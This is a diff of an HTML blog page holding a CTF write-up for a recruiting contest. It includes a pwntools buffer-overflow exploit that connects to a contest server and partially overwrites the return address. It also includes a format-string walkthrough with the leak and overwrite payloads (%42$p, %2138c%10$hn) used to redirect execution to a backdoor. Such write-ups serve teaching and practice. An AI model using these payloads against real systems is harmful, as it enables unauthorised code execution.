@@ -8,14 +8,14 @@
   <link rel="dns-prefetch" href="http://l0tus.vip">
   <title>0rays Recruiting Contest | L0tus&#39; blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ez_aaa | donePIE enabledPartial Write &amp; Good Luck exp:1234567from pwn import*p&#x3D;remote(&quot;124.222.96.143&quot;,&quot;10035&quot;)#p&#x3D;process(&quot;.&#x2F;ez_aaa&quot;)payload&#x3D;b&amp;#x27;a&amp;#x27;*0x38paylo">
+  <meta name="description" content="ez_aaa | done">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0rays Recruiting Contest">
 <meta property="og:url" content="http://l0tus.vip/2022/12/12/0rays/index.html">
 <meta property="og:site_name" content="L0tus&#39; blog">
-<meta property="og:description" content="ez_aaa | donePIE enabledPartial Write &amp; Good Luck exp:1234567from pwn import*p&#x3D;remote(&quot;124.222.96.143&quot;,&quot;10035&quot;)#p&#x3D;process(&quot;.&#x2F;ez_aaa&quot;)payload&#x3D;b&amp;#x27;a&amp;#x27;*0x38paylo">
+<meta property="og:description" content="ez_aaa | done">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://l0tus.vip/%22https:/raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/backdoor_1.png%22">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/backdoor_1.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_4.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_1.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_2.png">
@@ -28,11 +28,11 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/misc_3.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/misc_4.png">
 <meta property="article:published_time" content="2022-12-11T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-12-12T10:17:56.036Z">
+<meta property="article:modified_time" content="2022-12-12T11:01:24.296Z">
 <meta property="article:author" content="L0tus">
 <meta property="article:tag" content="write up">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://l0tus.vip/%22https:/raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/backdoor_1.png%22">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/backdoor_1.png">
   
     <link rel="alternative" href="/atom.xml" title="L0tus&#39; blog" type="application/atom+xml">
   
@@ -207,8 +207,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <span id="more"></span>
-<h1 id="ez-aaa-done"><a href="#ez-aaa-done" class="headerlink" title="ez_aaa | done"></a>ez_aaa | done</h1><p><img src="/%22https:/raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/backdoor_1.png%22" alt="test"><br>PIE enabled<br>Partial Write &amp; Good Luck</p>
+        <h1 id="ez-aaa-done"><a href="#ez-aaa-done" class="headerlink" title="ez_aaa | done"></a>ez_aaa | done</h1><span id="more"></span>
+<p><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/backdoor_1.png" alt="test"><br>PIE enabled<br>Partial Write &amp; Good Luck</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;124.222.96.143&quot;</span>,<span class="string">&quot;10035&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./ez_aaa&quot;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload+=p64(<span class="number">0x6DA</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="ez-fmt-done"><a href="#ez-fmt-done" class="headerlink" title="ez_fmt | done"></a>ez_fmt | done</h1><p><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_4.png" alt="test"><br>Offset: 8<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_1.png" alt="test"><br>gdb<br>Set a breakpoint at vuln<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_2.png" alt="test"><br>Write some gabbage<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_3.png" alt="test"><br>Check the stack when it comes to printf<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_6.png" alt="test"><br>The red square is what we need to leak while the blue refers to return adderss<br>The offset of rbp &#x3D; 0x24 - 0x2 + 8 &#x3D; 42 (D)<br>Thus we can leak rbp via: %42$p<br>Return address on stack &#x3D; rbp - 0x8<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_5.png" alt="test"><br>backdoor_addr &#x3D; 0x40085A<br>Initial retaddress &#x3D; 0x400964<br>Thus, we need to cover 0x085A on 0x0964, 0x085A equals to 2138 ( D )<br>%2138c%10$hnaaaa<br>aaaa is used for aligning and we can figure out from gdb that retaddressOnstack is the 10th<br>parameter</p>
 <p>Don’t forget to send EOF to end the loop and then return to backdoor</p>
